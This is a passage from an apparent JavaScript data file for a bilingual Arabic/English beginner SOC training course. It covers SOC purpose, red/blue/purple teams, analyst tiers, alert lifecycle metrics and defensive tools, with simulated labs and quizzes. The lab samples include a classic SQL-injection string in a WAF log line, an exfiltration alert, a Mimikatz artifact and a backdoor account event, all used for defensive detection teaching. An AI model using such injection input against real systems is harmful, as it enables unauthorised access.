// Master Courses Data Repository - Level 1: Beginner SOC Track
// Courses 1, 2, 3 - 26 Comprehensive Lessons
// BasharSec Academy - Master Curriculum

const coursesData = [
  {
    id: "course-1",
    courseNumber: 1,
    level: "beginner",
    levelNameAr: "المستوى الأول: مبتدئ",
    levelNameEn: "Level 1: Beginner",
    levelBadgeColor: "#10B981",
    titleAr: "مدخل الـ SOC وهيكلية الفرق الأمنية",
    titleEn: "SOC Fundamentals & Security Teams Architecture",
    summaryAr: "الانطلاقة الاحترافية الشاملة: ما هو مركز العمليات الأمنية؟ ولماذا تستثمر المؤسسات الملايين لبنائه؟ الفرق الجوهري بين الفرق الأمنية، الهيكل الوظيفي، دورة حياة التنبيه الأمني، والتقنيات الأساسية.",
    summaryEn: "The essential kickoff: What is a SOC? Roles, tiers, alert lifecycle, core defense technologies, and a realistic day in the life of a SOC analyst.",
    icon: "🛡️",
    duration: "6 ساعات تدريبية",
    lessonsCount: 6,
    badgeAr: "مبتدئ الـ SOC المعتمد",
    badgeEn: "Certified SOC Cadet",
    lessons: [
      {
        id: "lesson-1-1",
        courseId: "course-1",
        number: "1.1",
        titleAr: "ما هو مركز العمليات الأمنية (SOC)؟ ولماذا تنفق الشركات الملايين لبنائه؟",
        titleEn: "What is a SOC? Business Value, Mission & 24/7 Monitoring",
        duration: "45 min",
        theoryAr: `
<h3>مرحباً بك في مركز العمليات الأمنية: خط الدفاع الأول للمؤسسات الحديثة</h3>
<p class="lead">مركز العمليات الأمنية (Security Operations Center - SOC) هو الغرفة المركزية الموحدة المسؤولة عن مراقبة، اكتشاف، تحليل، واحتواء التهديدات السيبرانية على مدار الساعة وطوال أيام السنة (24/7/365). تنفق كبرى المؤسسات البنكية والحكومية ملايين الدولارات سنوياً على الـ SOC لأن تكلفة الاختراق الواحد غير المكتشف تتجاوز في المتوسط 4.45 مليون دولار وفقاً لتقارير IBM العالمية، ناهيك عن تدمير السمعة والامتثال القانوني.</p>

<div class="callout-info">
  <h4>💡 التشبيه الحقيقي: برج المراقبة وغرفة الطوارئ المتكاملة</h4>
  <p>يعمل الـ SOC مثل برج مراقبة الطيران المدمج مع غرفة طوارئ مستشفى: تتدفق إليه ملايين الإشارات وسجلات الأحداث في كل ثانية من كل ركن في المؤسسة (حواسيب الموظفين، خوادم قواعد البيانات، جدران الحماية، والأنظمة السحابية). مهمة المحلل هي غربلة هذا الضجيج الهائل لاكتشاف أي وميض غير طبيعي قبل أن يتحول إلى كارثة تشفير فدية أو تسريب أسرار.</p>
</div>

<h4>أعمدة الـ SOC الثلاثة (The People, Process, Technology Triad)</h4>
<p>لا يقتصر الـ SOC على شاشات براقة وأدوات باهظة الثمن، بل يرتكز على توازن صارم بين ثلاثة أركان:</p>
<ul>
  <li><strong>الكوادر البشرية (People):</strong> المحللون الأمنيون بمستوياتهم المختلفة (Tier 1 Triage, Tier 2 Incident Responders, Tier 3 Threat Hunters, SOC Managers). الإنسان هو العنصر الوحيد القادر على استنتاج دوافع المهاجم وتفكيك الحيل المعقدة.</li>
  <li><strong>العمليات والسياسات (Processes):</strong> كراسات التشغيل (Playbooks)، معايير الفرز (SOPs)، واتفاقيات مستوى الخدمة (SLAs) التي تحدد بدقة متناهية كيف يتصرف الفريق عند ظهور كل نوع من التهديدات دون ارتباك.</li>
  <li><strong>التقنيات والأدوات (Technology):</strong> منظومات الـ SIEM لجمع السجلات، الـ EDR لحماية النقاط الطرفية، الـ SOAR لأتمتة الاستجابة، ومنصات استخبارات التهديدات (TIP).</li>
</ul>

<h4>أنماط ونماذج مراكز العمليات الأمنية في الشركات</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>النموذج (SOC Model)</th>
        <th>طبيعة العمل</th>
        <th>المزايا والعيوب</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>الـ SOC الداخلي (In-House SOC)</strong></td>
        <td>فريق موظفين بدوام كامل داخل مقر المؤسسة وتحت إدارتها المباشرة.</td>
        <td>أقصى درجات السرية والسيطرة على البيانات، ولكنه عالي التكلفة المالية ويصعب استقطاب الكفاءات فيه 24/7.</td>
      </tr>
      <tr>
        <td><strong>الـ SOC المدار خارجياً (MSSP / MDR)</strong></td>
        <td>التعاقد مع شركة أمن سيبراني متخصصة تقدم المراقبة كخدمة سحابية.</td>
        <td>تكلفة اقتصادية مرنة وجاهزية سريعة، لكن الرؤية الداخلية لخصوصية الأعمال تكون أقل عمقاً.</td>
      </tr>
      <tr>
        <td><strong>النموذج الهجين (Hybrid SOC)</strong></td>
        <td>فريق داخلي يشرف على الاستجابة والتخطيط نهاراً، مع تفويض المراقبة الليلية للمزود الخارجي.</td>
        <td>الخيار الأكثر انتشاراً حالياً في الشركات المتوسطة والكبرى لتحقيق توازن التكلفة والتغطية المستمرة.</td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي مناوبة الـ SOC (SOC Console Simulator)</span>
    <h4>مراقبة لوحة التنبيهات في الزمن الحقيقي</h4>
  </div>
  <p>أنت الآن في مقعد محلل SOC Tier 1 في بداية مناوبتك، تفحص التنبيه الحرج الذي تصدر واجهة الـ SIEM:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> soc-siem-alert-feed</div>
    <pre class="terminal-code">[CRITICAL ALERT] Rule: Potential Data Exfiltration via HTTPS
Timestamp: 2026-11-07 04:12:09 UTC | Sensor: Perimeter-FW-01
Source Host: 10.0.12.84 (Workstation-HR-Fin)
Destination IP: 194.135.211.9 (Uncategorized External - Russia)
Bytes Sent: 1,482,920,400 bytes (~1.48 GB in 4 minutes)
Associated Process: powershell.exe (PID: 4920)</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('netstat -ano | findstr 194.135.211.9', 'standalone-term-body'); app.showToast('تم فحص الاتصال النشط في الطرفية', 'info');">فحص الاتصال عبر الطرفية: netstat</button>
    <button class="btn-cmd" onclick="runSimCommand('get-process -id 4920 | select ProcessName, Path, Company', 'standalone-term-body'); app.showToast('تم التحقق من بيانات العملية', 'info');">تشريح العملية: powershell.exe</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "لماذا تتبنى كبرى الشركات نموذج الـ SOC المدار 24/7/365 بدلاً من الاكتفاء بساعات العمل الرسمية (8 صباحاً إلى 5 مساءً)؟",
          questionEn: "Why do enterprises adopt a 24/7/365 SOC model instead of standard business hours?",
          optionsAr: [
            "لأن المهاجمين السيبرانيين يتعمدون شن هجمات التسلل والفدية ليلاً وفي العطلات الرسمية لاستغلال غياب الموظفين وبطء الاستجابة",
            "لأن خوادم الشبكة تتوقف عن العمل تلقائياً إذا لم يراقبها مهندس أمني كل ساعة",
            "لأن جدران الحماية Firewalls لا تستطيع حظر الحزم المشبوهة خارج أوقات الدوام الرسمي",
            "فقط لتلبية متطلبات التسويق وعرض شاشات العرض للزوار"
          ],
          optionsEn: [
            "Because attackers deliberately strike at night and during public holidays to exploit minimal staffing and slow response",
            "Because network servers shut down automatically if not monitored hourly",
            "Because firewalls cannot block packets outside working hours",
            "Solely for marketing appearance to show screens to visitors"
          ],
          correctIndex: 0,
          explanationAr: "تستهدف عصابات الفدية والاختراق المتقدم (APTs) فترات الليل ونهاية الأسبوع لتقليل احتمالية التدخل السريع للمدافعين، ولذلك يعد التواجد الأمني 24/7/365 ضرورة حتمية لحماية المؤسسة."
        }
      },
      {
        id: "lesson-1-2",
        courseId: "course-1",
        number: "1.2",
        titleAr: "الفرق التفصيلي بين الفرق الأمنية: Red Team vs Blue Team vs Purple Team vs GRC",
        titleEn: "Cybersecurity Teams: Red vs Blue vs Purple Teaming & GRC",
        duration: "40 min",
        theoryAr: `
<h3>خريطة الألوان السيبرانية: كيف تتكامل الأدوار لحماية القلعة الرقمية؟</h3>
<p class="lead">في بيئات الأمن السيبراني الاحترافية، لا يمكن لشخص واحد أو فريق منفرد حماية المؤسسة واختبارها في آن واحد؛ إذ يتطلب الدفاع الناجح محاكاة هجومية مستمرة، وحوكمة صارمة تضمن الالتزام بالمعايير التشريعية.</p>

<div class="grid-2" style="display:grid; grid-template-columns:1fr 1fr; gap:1.25rem; margin:1.5rem 0;">
  <div style="background:var(--bg-tertiary); padding:1.25rem; border-radius:var(--radius-md); border-inline-start:4px solid #ef4444;">
    <h4 style="color:#ef4444; margin-top:0;">🔴 الفريق الأحمر (Red Team - الهجوم والمحاكاة)</h4>
    <p>يمثل المهاجمين الأخلاقيين؛ مهمتهم التفكير والتصرف كعصابات الـ APT الحقيقية. يستخدمون الهندسة الاجتماعية، استغلال ثغرات الـ Zero-Day، والتسلل المادي لمحاكاة حملات اختراق واقعية بهدف اختبار قدرة المنظومة الدفاعية على الصمود.</p>
  </div>
  <div style="background:var(--bg-tertiary); padding:1.25rem; border-radius:var(--radius-md); border-inline-start:4px solid #06b6d4;">
    <h4 style="color:#06b6d4; margin-top:0;">🔵 الفريق الأزرق (Blue Team - الدفاع والـ SOC)</h4>
    <p>يمثل حراس القلعة والمحللين الأمنيين (وهو الفريق الذي تؤهلك هذه الأكاديمية لاحترافه). مهمتهم المراقبة الحية للشبكة، ضبط أدوات الحماية (SIEM, EDR, Firewalls)، التحقيق الجنائي، واحتواء الاختراقات قبل انتشارها.</p>
  </div>
</div>

<div class="grid-2" style="display:grid; grid-template-columns:1fr 1fr; gap:1.25rem; margin:1.5rem 0;">
  <div style="background:var(--bg-tertiary); padding:1.25rem; border-radius:var(--radius-md); border-inline-start:4px solid #a855f7;">
    <h4 style="color:#a855f7; margin-top:0;">🟣 الفريق البنفسجي (Purple Team - التعاون والتكامل)</h4>
    <p>ليس فريقاً مستقلاً بقدر ما هو منهجية تواصل تدمج بين الـ Red Team والـ Blue Team في تمارين مشتركة فورية. ينفذ الفريق الأحمر تقنية معينة (مثل Kerberoasting)، بينما يتأكد الفريق الأزرق فوراً من ظهور سجلاتها في الـ SIEM وضبط قواعد الكشف لسد الثغرة.</p>
  </div>
  <div style="background:var(--bg-tertiary); padding:1.25rem; border-radius:var(--radius-md); border-inline-start:4px solid #10b981;">
    <h4 style="color:#10b981; margin-top:0;">🟢 الحوكمة وإدارة المخاطر والامتثال (GRC)</h4>
    <p>العمود الفقري القانوني والتنظيمي للمؤسسة؛ يضع السياسات الأمنية، يقيم المخاطر التشغيلية، ويتأكد من امتثال الشركة للمعايير الإلزامية مثل ISO 27001، PCI-DSS للدفع الإلكتروني، ولوائح الأمن السيبراني الوطنية (NCA في السعودية و NIST عالمياً).</p>
  </div>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 تمرين الفريق البنفسجي المشترك (Purple Team Exercise)</span>
    <h4>مزامنة محاكاة الهجوم مع فاعلية قواعد الكشف في الـ SOC</h4>
  </div>
  <p>أجرى الفريق الأحمر محاكاة لإنشاء مستخدم خبيث بصلاحيات مدير الدومين، تحقق كفريق أزرق من التقاط السجل عبر المحاكي:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> windows-event-viewer-cli</div>
    <pre class="terminal-code">PS C:\Windows\System32> Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720} -MaxEvents 1 | Format-List
TimeCreated  : 2026-11-07 04:30:15
Id           : 4720 (A user account was created)
TargetUserName: backdoor_svc
SubjectUserName: Administrator
PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('Get-WinEvent -FilterHashtable @{LogName=\'Security\'; Id=4728}', 'standalone-term-body'); app.showToast('تم فحص إضافة المستخدم لمجموعة مدراء الدومين', 'info');">فحص الإضافة للمجموعة 4728</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الدور الرئيسي لمنهجية 'الفريق البنفسجي' (Purple Team) في بيئة العمل الأمني؟",
          questionEn: "What is the primary objective of Purple Teaming?",
          optionsAr: [
            "استبدال الفريقين الأحمر والأزرق نهائياً لتوفير النفقات التشغيلية",
            "سد الفجوة بين الهجوم والدفاع من خلال مشاركة النتائج فوراً لتطوير واختبار قواعد الكشف في الـ SOC",
            "التركيز الحصري على كتابة تقارير الامتثال القانوني والمالي للإدارة العليا",
            "فحص أجهزة الموظفين فيزيائياً ومسح الغبار عنها أسبوعياً"
          ],
          optionsEn: [
            "Completely replace Red and Blue teams to cut operational costs",
            "Bridge the gap between offense and defense to collaboratively validate and optimize detection rules",
            "Focus exclusively on drafting legal and financial compliance reports",
            "Physically inspect employee hardware and dust workstations weekly"
          ],
          correctIndex: 1,
          explanationAr: "الفريق البنفسجي يضمن ألا تكون تدريبات الهجوم مجرد استعراض قوة، بل أداة عملية يتعلم منها الفريق الأزرق كيف يرى الهجوم في السجلات ويضبط تنبيهاته لاكتشافه مستقبلاً."
        }
      },
      {
        id: "lesson-1-3",
        courseId: "course-1",
        number: "1.3",
        titleAr: "الهيكل الوظيفي داخل الـ SOC: المهام اليومية لمحلل Tier 1، Tier 2، Tier 3، ومدير الـ SOC",
        titleEn: "SOC Roles & Tiers: Day-to-Day Responsibilities of Tiers 1, 2, 3 & SOC Manager",
        duration: "50 min",
        theoryAr: `
<h3>التسلسل القيادي والمسار المهني في مركز العمليات الأمنية</h3>
<p class="lead">لكي يعمل مركز العمليات الأمنية بكفاءة عالية دون إرهاق أو ضياع للتنبيهات، يُقسم الفريق وفق مستويات تصعيد صارمة ومتسلسلة (Tiered Architecture). هذا التقسيم يضمن أن كل شخص يركز على نطاق خبرته الدقيق.</p>

<h4>1. محلل فرز التنبيهات (SOC Tier 1 - Triage Analyst)</h4>
<p>خط الدفاع المباشر الأول (Frontline Defender). يجلس أمام شاشات الـ SIEM ويستقبل آلاف التنبيهات يومياً. مهامه اليومية تشمل:</p>
<ul>
  <li>التحقق الأولي من صحة التنبيه: هل هو إيجابي حقيقي (True Positive) أم إيجابي كاذب (False Positive)؟</li>
  <li>جمع المؤشرات الأولية (IOCs) مثل عناوين الـ IP، هاشات الملفات، وتفاصيل الحسابات المتورطة.</li>
  <li>تنفيذ خطوات الاحتواء الأولية المعتمدة في كراسات التشغيل (Playbooks)، مثل عزل جهاز مصاب مؤقتاً.</li>
  <li>تصعيد الحادث مع تقرير مبدئي إلى المستوى الثاني إذا ثبت وجود اختراق معقد.</li>
</ul>

<h4>2. المحقق الأمني والاستجابة للحوادث (SOC Tier 2 - Incident Responder)</h4>
<p>يتسلم الحوادث المصعدة من Tier 1. مهامه اليومية تشمل:</p>
<ul>
  <li>التحقيق المعمق وتتبع مسار الهجوم: متى دخل المهاجم؟ كيف تنقل في الشبكة (Lateral Movement)؟ وما هي البيانات التي تم الوصول إليها؟</li>
  <li>التحقيق الجنائي الرقمي على النقاط الطرفية (Endpoint Forensics) وفحص الذاكرة وسجلات النظام.</li>
  <li>قيادة عملية الاستئصال والتعافي (Eradication & Remediation) بالتعاون مع فرق هندسة الشبكات والأنظمة.</li>
</ul>

<h4>3. صائد التهديدات ومهندس الاكتشاف (SOC Tier 3 - Threat Hunter & Detection Engineer)</h4>
<p>المحلل الأكثر خبرة؛ لا ينتظر إطلاق التنبيهات بل يبدأ بافتراض أن الشبكة مخترقة بالفعل دون علم أحد:</p>
<ul>
  <li>صيد التهديدات الاستباقي (Proactive Threat Hunting) بالبحث عن الأنماط الخفية وسلوكيات الـ Living-off-the-Land (LOLBins).</li>
  <li>هندسة قواعد الكشف وتطوير قواعد YARA و Sigma واستعلامات SIEM المتطورة لسد الثغرات المكتشفة.</li>
  <li>تشريح البرمجيات الخبيثة المتقدمة (Advanced Malware Reverse Engineering).</li>
</ul>

<h4>4. مدير الـ SOC وقائد العمليات (SOC Lead / SOC Manager)</h4>
<p>الإشراف الشامل على العمليات، إدارة وتوزيع المناوبات، قياس مؤشرات الأداء (KPIs/SLAs)، إعداد الميزانيات، والتنسيق المباشر مع المدير التنفيذي لأمن المعلومات (CISO) أثناء الأزمات الأمنية الكبرى.</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تصعيد التذاكر الأمنية (SOC Ticket Escalation)</span>
    <h4>تحويل تنبيه مشبوه من Tier 1 إلى Tier 2</h4>
  </div>
  <p>قمت بفرز تنبيه تنزيل ملف مشبوه في قسم الحسابات، تفحص التذكرة المصعدة:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> soc-ticketing-system</div>
    <pre class="terminal-code">TICKET-ID: INC-2026-8812
Status: ESCALATED TO TIER 2
Priority: HIGH (Sev-2)
Summary: Mimikatz artifact detected in C:\Users\Public\mimilib.dll
Affected Host: FIN-PC-09 (10.0.4.52)
Actions Taken by Tier 1: Host isolated from network via EDR; Initial memory dump captured.
Reason for Escalation: Active credential dumping attempt detected; requires full scope investigation of lateral movement.</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('triage-verify INC-2026-8812', 'standalone-term-body'); app.showToast('تم إرسال إشعار استلام الحادث لمحلل Tier 2', 'success');">تأكيد التصعيد لـ Tier 2</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الاختصاص المحوري الأساسي لمحلل SOC Tier 1 بالمقارنة مع محلل Tier 3؟",
          questionEn: "What is the core distinction between a Tier 1 Analyst and a Tier 3 Hunter?",
          optionsAr: [
            "محلل Tier 1 يركز على فرز وتصنيف التنبيهات الحية والتحقق الأولي منها، بينما Tier 3 يتصيد التهديدات الخفية استباقياً ويطور قواعد الكشف المتقدمة",
            "محلل Tier 1 يكتب شفرات البرمجيات الخبيثة، بينما Tier 3 يمسحها فقط",
            "محلل Tier 1 مسؤول عن شراء أجهزة الحواسيب وشاشات العرض للشركة",
            "لا يوجد أي فرق وظيفي بينهما؛ المسميات للدعاية فقط"
          ],
          optionsEn: [
            "Tier 1 focuses on real-time triage and initial alert validation, whereas Tier 3 proactively hunts hidden threats and engineers detection rules",
            "Tier 1 authors malware code while Tier 3 deletes it",
            "Tier 1 is in charge of hardware procurement",
            "There is no functional distinction between them"
          ],
          correctIndex: 0,
          explanationAr: "محلل المستوى الأول هو بوابة الاستقبال والفرز السريع لكل تنبيه ينطلق في المنظومة، بينما المستوى الثالث خبير استباقي يبحث في أعماق البيانات دون انتظار تنبيه مسبق."
        }
      },
      {
        id: "lesson-1-4",
        courseId: "course-1",
        number: "1.4",
        titleAr: "دورة حياة التنبيه الأمني (Alert Lifecycle) ومقاييس الأداء العالمية (MTTD, MTTR, MTTA, SLA)",
        titleEn: "Alert Lifecycle & Critical SOC Metrics: MTTD, MTTA, MTTR & SLAs",
        duration: "45 min",
        theoryAr: `
<h3>دورة حياة التنبيه الأمني من لحظة ولادته حتى إغلاق الحادثة</h3>
<p class="lead">لا يتم التعامل مع التهديدات بعشوائية؛ بل يتبع كل تنبيه دورة حياة صارمة تتكون من 5 مراحل معيارية تضمن عدم إفلات أي مؤشر خطر:</p>

<ol>
  <li><strong>1. التوليد والاكتشاف (Alert Triggering & Ingestion):</strong> يلتقط الحساس (جدار حماية، EDR، أو برنامج مكافحة الفيروسات) نشاطاً مريباً ويرسله كـ Log للـ SIEM حيث تطلق قاعدة الارتباط (Correlation Rule) تنبيهاً موثقاً.</li>
  <li><strong>2. الفرز والتصنيف الأولي (Triage & Categorization):</strong> يستلم محلل Tier 1 التنبيه ويفحصه لتحديد صحته:
    <ul>
      <li><strong>إيجابي حقيقي (True Positive - TP):</strong> هجوم أو نشاط خبيث فعلي يتطلب تدخلاً فورياً.</li>
      <li><strong>إيجابي كاذب (False Positive - FP):</strong> نشاط سليم مشروع أطلق تنبيهاً خاطئاً بسبب حساسية القاعدة الزائدة (مثل قيام المطور بتجربة سكريبت).</li>
      <li><strong>إيجابي حقيقي غير ضار (Benign True Positive - BTP):</strong> نشاط خبيث الشبه تم تنفيذه لأغراض إدارية مصرح بها (مثل فحص ثغرات مجدول).</li>
    </ul>
  </li>
  <li><strong>3. الاحتواء المبدئي (Initial Containment):</strong> اتخاذ إجراء سريع لمنع تفاقم الخطر (مثل عزل الحاسوب أو حظر نطاق الـ C2).</li>
  <li><strong>4. التحقيق والاستئصال (Deep Investigation & Eradication):</strong> معرفة المريض صفر (Patient Zero) وحذف ملفات التثبيت والبقايا الخبيثة.</li>
  <li><strong>5. إغلاق الحادثة والدروس المستفادة (Closure & Lessons Learned):</strong> توثيق كل ما حدث وتحديث قواعد الكشف لمنع تكرار الهجوم بنفس الطريقة.</li>
</ol>

<h4>أهم مقاييس الأداء العالمية في الـ SOC (SOC Operational Metrics)</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>المقياس (Metric)</th>
        <th>الاسم الكامل</th>
        <th>ماذا يقيس بالضبط؟</th>
        <th>المعيار المستهدف عالمياً</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>MTTA</strong></td>
        <td>Mean Time to Acknowledge</td>
        <td>متوسط الوقت من لحظة ظهور التنبيه حتى فتحه وتعيينه للمحلل.</td>
        <td>أقل من 5 إلى 15 دقيقة للتنبيهات الحرجة.</td>
      </tr>
      <tr>
        <td><strong>MTTD</strong></td>
        <td>Mean Time to Detect</td>
        <td>متوسط الوقت من لحظة دخول المهاجم إلى أنظمة الشركة حتى يكتشفه الـ SOC.</td>
        <td>دقائق إلى ساعات (تجاوزت قديماً شهوراً في الهجمات المتقدمة).</td>
      </tr>
      <tr>
        <td><strong>MTTR</strong></td>
        <td>Mean Time to Respond / Resolve</td>
        <td>متوسط الوقت المستغرق لاحتواء الهجوم بالكامل واستئصال الخطر.</td>
        <td>أقل من 30 إلى 60 دقيقة في حوادث الفدية النشطة.</td>
      </tr>
      <tr>
        <td><strong>SLA</strong></td>
        <td>Service Level Agreement</td>
        <td>اتفاقية مستوى الخدمة الإلزامية التي تلزم الفريق بأوقات استجابة محددة لكل درجة خطورة.</td>
        <td>الالتزام بنسبة 99% من التذاكر المصعدة.</td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 حساب مؤشرات الـ SLA في الـ SOC (Metrics Calculator)</span>
    <h4>تحليل سرعة استجابة الفريق لحادثة سيبرانية</h4>
  </div>
  <p>تفحص بيانات التذكرة التالية لحساب زمن الاستجابة والتعرف على مدى الالتزام بـ SLA:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> soc-kpi-tracker</div>
    <pre class="terminal-code">Incident ID: INC-2026-0041 (Severity: Critical)
Infiltration Timestamp (Attacker In): 02:14:00 UTC
Alert Triggered Timestamp:            02:16:30 UTC -> (MTTD = 2m 30s)
Analyst Assigned Timestamp:           02:19:10 UTC -> (MTTA = 2m 40s)
Host Isolated & Blocked:              02:38:00 UTC -> (MTTR = 18m 50s)
SLA Target for Critical Sev-1: 30 Minutes -> RESULT: SLA MET (SUCCESS)</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الفارق بين مقياسي MTTD (Mean Time to Detect) و MTTR (Mean Time to Respond)؟",
          questionEn: "What is the key difference between MTTD and MTTR?",
          optionsAr: [
            "MTTD يقيس متوسط سرعة اكتشاف وجود الهجوم، بينما MTTR يقيس متوسط الوقت المستغرق لاحتوائه وحل المشكلة بالكامل",
            "MTTD يقيس سرعة كتابة التقارير، بينما MTTR يقيس سرعة شراء الأدوات البرمجية",
            "لا يوجد أي فرق بينهما، كلاهما يقيسان سرعة سرقة البيانات",
            "MTTD خاص بالفريق الأحمر فقط، بينما MTTR خاص بموظفي الموارد البشرية"
          ],
          optionsEn: [
            "MTTD measures how fast an intrusion is detected, while MTTR measures the time to contain and resolve the threat",
            "MTTD measures report writing speed while MTTR measures purchasing speed",
            "There is no difference",
            "MTTD is for Red Team only while MTTR is for HR"
          ],
          correctIndex: 0,
          explanationAr: "يعبر MTTD عن يقظة المنظومة وسرعة كشف الاختراق (Detection)، بينما يعبر MTTR عن جاهزية وكفاءة فرق الاستجابة في عزل الخطر وإصلاح الأضرار (Response/Resolution)."
        }
      },
      {
        id: "lesson-1-5",
        courseId: "course-1",
        number: "1.5",
        titleAr: "التقنيات الأساسية داخل غرفة الـ SOC: الفرق بين Firewall, IDS/IPS, EDR, SIEM, SOAR, و Threat Intel",
        titleEn: "Core SOC Technologies: Firewalls, IDS/IPS, EDR, SIEM, SOAR & Threat Intelligence",
        duration: "55 min",
        theoryAr: `
<h3>الترسانة التقنية لمحلل العمليات الأمنية الحديث</h3>
<p class="lead">لا يمكن لمحلل الـ SOC التعامل مع مليارات الأحداث يدوياً؛ لذلك يعتمد على حزمة تقنيات متكاملة تشكل شبكة دفاعية مترابطة من المحيط الخارجي حتى داخل أنوية الحواسيب.</p>

<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>التقنية</th>
        <th>الوظيفة الأساسية</th>
        <th>مكان التواجد</th>
        <th>أشهر المنتجات في السوق</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Firewall (جدار الحماية)</strong></td>
        <td>بوابة العبور؛ يراقب ويفلتر الحزم الصادرة والواردة بناءً على بورتات وعناوين وقواعد تدقيق الحزم.</td>
        <td>محيط الشبكة الخارجي ومداخل السيرفرات.</td>
        <td>Palo Alto, Fortinet, Check Point, pfSense.</td>
      </tr>
      <tr>
        <td><strong>IDS / IPS</strong></td>
        <td>أنظمة كشف ومنع التسلل؛ تفتش محتوى الحزم (Deep Packet Inspection) لمطابقة توقيعات الهجمات وحظرها تلقائياً.</td>
        <td>في مسار حركة الشبكة المباشر (Inline أو Out-of-band).</td>
        <td>Snort, Suricata, Cisco Firepower, Zeek.</td>
      </tr>
      <tr>
        <td><strong>EDR (حماية النقاط الطرفية)</strong></td>
        <td>عين المحلل على أجهزة الحواسيب؛ يراقب كل عملية تُنفذ، كل اتصال شبكي ينشأ، ويوقف تشغيل البرمجيات الخبيثة فوراً.</td>
        <td>عميل برمجي (Agent) مثبت على كل لابتوب وخادم.</td>
        <td>CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne.</td>
      </tr>
      <tr>
        <td><strong>SIEM (إدارة السجلات والارتباط)</strong></td>
        <td>الدماغ المركزي للـ SOC؛ يجمع مليارات السجلات من كل مكان ويوحدها ويحللها بقواعد ذكية لإطلاق التنبيهات.</td>
        <td>خوادم مركزية أو منصات سحابية ضخمة.</td>
        <td>Splunk, Microsoft Sentinel, IBM QRadar, Wazuh, Elastic Security.</td>
      </tr>
      <tr>
        <td><strong>SOAR (الأتمتة والاستجابة)</strong></td>
        <td>الذراع التنفيذي الآلي؛ ينفذ إجراءات الاستجابة الروتينية تلقائياً بسرعة البرق (مثل عزل جهاز أو حظر IP خلال ثوانٍ).</td>
        <td>متصل بالـ SIEM وأدوات الأمان عبر APIs.</td>
        <td>Cortex XSOAR, Splunk SOAR, Swimlane.</td>
      </tr>
      <tr>
        <td><strong>Threat Intel (استخبارات التهديدات)</strong></td>
        <td>رادار التهديدات العالمية؛ يغذي الـ SOC بقوائم عناوين الـ IP والمواقع والهاشات المشبوهة التي تستخدمها عصابات القرصنة حالياً.</td>
        <td>خلاصات بيانات (Feeds) تتدفق للـ SIEM.</td>
        <td>VirusTotal, AbuseIPDB, Recorded Future, MISP, AlienVault OTX.</td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تكامل أدوات الـ SOC (SOC Tech Stack Simulator)</span>
    <h4>تتبع تدفق التهديد عبر منظومة الدفاع المتكاملة</h4>
  </div>
  <p>أرسل مهاجم باكت خبيث يحاول استغلال ثغرة ويب، شاهد كيف تتفاعل الأدوات معاً بالترتيب:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> pipeline-integrator</div>
    <pre class="terminal-code">[1. Network TAP] Captured external HTTP POST to /login.php
[2. WAF/IPS] Detected SQLi payload: ' OR '1'='1 -- Signature: SNORT-2026-SQLI
[3. SIEM Ingestion] Correlated with 5 previous requests from same IP (45.33.32.156)
[4. SOAR Trigger] Executed Playbook "Auto-Block-BruteForce-IP"
[5. Firewall API] Block rule pushed to Palo Alto Perimeter: Drop all traffic from 45.33.32.156</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الفارق الجوهري في معمارية الدفاع بين نظام EDR ونظام الـ SIEM؟",
          questionEn: "What is the key architectural difference between EDR and SIEM?",
          optionsAr: [
            "الـ EDR يراقب ويسجل ويتحكم بالأنشطة الداخلية للنقاط الطرفية كالحواسيب والخوادم، بينما الـ SIEM دماغ مركزي يجمع ويوحد السجلات من جميع المصادر المختلفة (شبكات، سيرفرات، EDR، جدران نارية)",
            "الـ EDR لا يعمل إلا على الهواتف المحمولة فقط",
            "الـ SIEM هو مجرد كابل شبكة نحاسي يربط الأجهزة ببعضها",
            "الـ EDR مخصص لكتابة رسائل البريد الإلكتروني بينما الـ SIEM للألعاب"
          ],
          optionsEn: [
            "EDR monitors, records and controls endpoint behaviors directly, while SIEM is the central aggregation engine correlating logs from all enterprise sources",
            "EDR works only on mobile phones",
            "SIEM is merely a physical Ethernet cable",
            "EDR is for emails while SIEM is for gaming"
          ],
          correctIndex: 0,
